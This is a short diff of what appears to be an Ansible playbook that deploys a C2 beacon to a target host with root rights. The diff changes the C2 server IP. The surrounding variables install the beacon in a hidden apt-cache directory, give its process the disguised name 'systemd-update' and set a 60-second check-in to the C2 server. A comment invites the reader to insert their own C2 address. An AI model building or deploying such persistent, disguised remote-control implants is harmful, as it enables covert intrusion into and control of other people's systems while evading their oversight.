@@ -3,7 +3,7 @@
   hosts: target
   become: yes
   vars:
-    c2_server_url: "http://100.65.2.138:8080"  # Change to your C2 IP
+    c2_server_url: "http://100.65.8.111:8080"  # Change to your C2 IP
     beacon_install_path: "/var/cache/apt/archives/.partial"
     beacon_name: "systemd-update"  # Process name
     check_in_interval: 60
